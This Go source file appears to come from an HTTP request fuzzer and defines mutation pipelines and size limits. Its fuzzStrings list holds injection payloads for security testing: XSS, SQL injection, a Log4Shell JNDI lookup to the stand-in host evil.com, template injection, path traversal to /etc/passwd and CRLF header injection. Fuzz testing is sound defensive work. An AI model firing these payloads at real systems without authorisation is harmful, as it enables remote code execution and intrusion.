// Package mutate implements mutation strategies for HTTP requests including
// URI, header, JSON body, param, and sequence-level mutations.
package mutate

import (
	"encoding/base64"
	"math/rand"
	"strings"

	"ffuuzz/internal/model"
)

// fuzzStrings are common security-relevant payloads used by multiple mutators
// (json:string_mutation and param:string_mutation) to inject into string values.
var fuzzStrings = []string{
	"",
	strings.Repeat("A", 1024),
	strings.Repeat("A", 65536),
	"\x00\x01\x02\x03",
	"<script>alert(1)</script>",
	"' OR '1'='1",
	"${jndi:ldap://evil.com/a}",
	"{{7*7}}",
	"../../../etc/passwd",
	"\r\nX-Injected: true",
	"\u0000",
	"\uFFFD",
	strings.Repeat("\u202E", 100), // RTL override
}

// MutationResult holds the output of a mutation operation.
type MutationResult struct {
	Exchange  model.Exchange
	Operators []string // names of applied mutation operators for reproducibility
	Seed      int64    // RNG seed used
}

// SequenceMutationResult holds the output of a sequence mutation.
type SequenceMutationResult struct {
	Exchanges []model.Exchange
	Operators []string
	Seed      int64
}

// ExchangeMutator mutates a single Exchange.
type ExchangeMutator interface {
	Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult
}

// SequenceMutator mutates a sequence of Exchanges.
type SequenceMutator interface {
	Mutate(exs []model.Exchange, rng *rand.Rand, intensity float64) SequenceMutationResult
}

// ExchangeMutatorFunc adapts a function to the ExchangeMutator interface.
type ExchangeMutatorFunc func(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult

func (f ExchangeMutatorFunc) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
	return f(ex, rng, intensity)
}

// Config controls which mutation classes are enabled and their parameters.
type Config struct {
	PathQuery      bool
	Headers        bool
	JSONBody       bool
	Params         bool
	Sequence       bool
	Intensity      float64
	MaxURLLen      int
	MaxHdrLen      int
	MaxBodyLen     int
	UserDictionary map[string][]string // header name -> possible values
}

// DefaultConfig returns sensible defaults for mutation configuration.
func DefaultConfig() Config {
	return Config{
		PathQuery:  true,
		Headers:    true,
		JSONBody:   true,
		Params:     true,
		Sequence:   true,
		Intensity:  0.5,
		MaxURLLen:  8192,
		MaxHdrLen:  8192,
		MaxBodyLen: 1 << 20, // 1MB
	}
}

// Pipeline composes multiple ExchangeMutators into a single mutator that applies
// enabled mutation classes in sequence based on the config.
type Pipeline struct {
	cfg       Config
	primitive *PrimitiveMutator
	uri       *URIMutator
	header    *HeaderMutator
	jsonM     *JSONMutator
	param     *ParamMutator
}

// NewPipeline creates a Pipeline from config.
func NewPipeline(cfg Config) *Pipeline {
	return &Pipeline{
		cfg:       cfg,
		primitive: &PrimitiveMutator{},
		uri:       &URIMutator{MaxURLLen: cfg.MaxURLLen},
		header:    &HeaderMutator{MaxHdrLen: cfg.MaxHdrLen, UserDict: cfg.UserDictionary},
		jsonM:     &JSONMutator{MaxBodyLen: cfg.MaxBodyLen},
		param:     &ParamMutator{},
	}
}

// Intensity returns the configured mutation intensity.
func (p *Pipeline) Intensity() float64 {
	return p.cfg.Intensity
}

// Mutate applies enabled mutation operators to an exchange.
func (p *Pipeline) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
	var ops []string
	result := ex

	if p.cfg.PathQuery && rng.Float64() < intensity {
		r := p.uri.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	if p.cfg.Headers && rng.Float64() < intensity {
		r := p.header.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	if p.cfg.JSONBody && rng.Float64() < intensity {
		r := p.jsonM.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	if p.cfg.Params && rng.Float64() < intensity {
		r := p.param.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	// If nothing was applied, at least apply a primitive mutation to the body
	if len(ops) == 0 {
		r := p.primitive.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	// Post-mutation size guards
	result = p.enforceSizeLimits(result)

	return MutationResult{Exchange: result, Operators: ops}
}

// enforceSizeLimits truncates URL, headers, and body that exceed configured maximums.
func (p *Pipeline) enforceSizeLimits(ex model.Exchange) model.Exchange {
	maxURL := p.cfg.MaxURLLen
	if maxURL <= 0 {
		maxURL = 8192
	}
	maxHdr := p.cfg.MaxHdrLen
	if maxHdr <= 0 {
		maxHdr = 8192
	}
	maxBody := p.cfg.MaxBodyLen
	if maxBody <= 0 {
		maxBody = 1 << 20
	}

	// Truncate path+query combined length
	combined := ex.Request.Path
	if ex.Request.Query != "" {
		combined += "?" + ex.Request.Query
	}
	if len(combined) > maxURL {
		if len(ex.Request.Path) > maxURL {
			ex.Request.Path = ex.Request.Path[:maxURL]
			ex.Request.Query = ""
		} else {
			remaining := maxURL - len(ex.Request.Path) - 1 // -1 for "?"
			if remaining > 0 && len(ex.Request.Query) > remaining {
				ex.Request.Query = ex.Request.Query[:remaining]
			} else if remaining <= 0 {
				ex.Request.Query = ""
			}
		}
	}

	// Truncate header values
	for k, vals := range ex.Request.Headers {
		for i, v := range vals {
			if len(v) > maxHdr {
				vals[i] = v[:maxHdr]
			}
		}
		ex.Request.Headers[k] = vals
	}

	// Truncate body (base64-encoded)
	if ex.Request.BodyB64 != "" {
		bodyBytes, err := base64.StdEncoding.DecodeString(ex.Request.BodyB64)
		if err == nil && len(bodyBytes) > maxBody {
			bodyBytes = bodyBytes[:maxBody]
			ex.Request.BodyB64 = base64.StdEncoding.EncodeToString(bodyBytes)
			ex.Request.BodyTruncated = true
		}
	}

	return ex
}

// mapKeys returns the keys of a map[string][]string (e.g. http.Header, url.Values).
func mapKeys(m map[string][]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// enforceSizeLimits applies configured maximum lengths to the mutated exchange
